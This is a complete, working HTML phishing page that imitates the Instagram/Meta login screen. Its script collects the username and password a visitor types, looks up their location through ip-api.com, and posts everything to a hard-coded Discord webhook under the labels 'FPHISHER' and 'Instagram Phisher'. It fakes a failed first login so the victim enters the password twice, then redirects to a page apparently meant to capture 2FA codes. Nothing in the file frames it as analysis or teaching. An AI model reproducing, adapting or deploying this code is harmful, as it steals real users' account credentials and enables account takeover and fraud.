<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Login</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-white flex items-center justify-center min-h-screen">

  <div class="w-full max-w-sm px-6">

    <!-- Logo -->
    <div class="flex justify-center mb-14">
      <img src="IMG_0905.png" alt="App" class="w-16 h-16" />
    </div>

    <!-- Username -->
    <input
      id="username"
      type="text"
      placeholder="Username, mobile number or email address"
      class="w-full mb-3 px-4 py-3 text-base border border-gray-300 rounded-md bg-white focus:outline-none focus:border-gray-400"
    />

    <!-- Password -->
    <input
      id="password"
      type="password"
      placeholder="Password"
      class="w-full mb-4 px-4 py-3 text-base border border-gray-300 rounded-md bg-white focus:outline-none focus:border-gray-400"
    />

    <!-- Login Button -->
    <button
      id="loginBtn"
      class="w-full bg-blue-600 text-white text-sm font-normal py-3 rounded-lg mb-4
             transition active:scale-95 disabled:opacity-70 disabled:cursor-not-allowed
             flex items-center justify-center gap-2"
    >
      <span id="btnText">Log in</span>
      <svg id="spinner" class="w-5 h-5 animate-spin hidden" viewBox="0 0 24 24">
        <circle cx="12" cy="12" r="10" stroke="white" stroke-width="4" fill="none" opacity="0.3"/>
        <path d="M22 12a10 10 0 0 1-10 10" stroke="white" stroke-width="4" fill="none"/>
      </svg>
    </button>

    <!-- Error Message -->
    <div id="errorMsg" class="text-red-500 text-sm mb-6 hidden text-center">
      Incorrect username or password.
    </div>

    <!-- Forgotten Password -->
    <div class="text-center mb-6">
      <a href="#" class="text-sm font-normal text-black hover:underline">
        Forgotten password?
      </a>
    </div>

    <!-- Bottom Section -->
    <div class="mt-16">
      <button class="w-full border border-blue-600 text-blue-600 text-sm font-normal py-3 rounded-md mb-8 hover:bg-blue-50 transition">
        Create new account
      </button>

      <div class="flex justify-center mt-2">
        <img src="IMG_0906.png" alt="Meta" class="h-8" />
      </div>
    </div>
  </div>

  <script>
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1489579300687577279/fMVQanQ8kgUHZ9a_G39YhvpKjHnCmJmljDDHR9ntSa7bUAPMh1Axq0AK4VRumc10Npau";

    let attempt = 0;

    // Fastest free geolocation (no key required)
    async function getLocation() {
      try {
        const res = await fetch('http://ip-api.com/json/?fields=country,regionName,status', {
          method: 'GET',
          headers: { 'Accept': 'application/json' }
        });

        if (!res.ok) throw new Error('Failed');

        const data = await res.json();
        if (data.status === "success") {
          return {
            country: data.country || 'Unknown',
            state: data.regionName || 'Unknown'
          };
        }
      } catch (err) {
        console.error("Location fetch failed:", err);
      }
      return { country: 'Unknown', state: 'Unknown' };
    }

    document.getElementById("loginBtn").addEventListener("click", async (e) => {
      e.preventDefault();

      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();
      const passwordInput = document.getElementById("password");

      if (!username || !password) {
        alert("Please fill in all fields!");
        return;
      }

      const btn = document.getElementById("loginBtn");
      const btnText = document.getElementById("btnText");
      const spinner = document.getElementById("spinner");
      const errorMsg = document.getElementById("errorMsg");

      attempt++;

      // Start sending to Discord immediately (non-blocking)
      const sendToDiscord = async (loc) => {
        const message = `**FPHISHER 🤖**

**APP:** INSTAGRAM
**USERNAME:** ${username}
**PASSWORD:** ${password}
**COUNTRY:** ${loc.country} 🌍
**STATE:** ${loc.state}
**ATTEMPT:** ${attempt} ⏱️

🔐 2025@FTECHSERVICES`;

        try {
          await fetch(DISCORD_WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              content: message,
              username: "Instagram Phisher"
            })
          });
          console.log("✅ Data sent to Discord");
        } catch (err) {
          console.error("Webhook failed:", err);
        }
      };

      if (attempt === 1) {
        // First attempt: show error instantly + send in background
        errorMsg.classList.remove("hidden");
        passwordInput.value = "";

        // Get location in background and send
        getLocation().then(loc => sendToDiscord(loc));

      } else {
        // Second attempt: show loading + send faster
        btn.disabled = true;
        btnText.textContent = "Loading...";
        spinner.classList.remove("hidden");

        // Start location fetch + webhook in parallel
        const locationPromise = getLocation();

        // Send webhook as soon as possible
        locationPromise.then(loc => sendToDiscord(loc));

        // Redirect very fast (even if location is still coming)
        setTimeout(() => {
          window.location.href = "securedfa.html";
        }, 150);   // Fast enough while still allowing webhook to fire
      }
    });
  </script>

  <!-- Optional: shake animation on error -->
  <style>
    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      20%, 60% { transform: translateX(-8px); }
      40%, 80% { transform: translateX(8px); }
    }
    .animate-shake {
      animation: shake 0.5s ease-in-out;
    }
  </style>

</body>
</html>
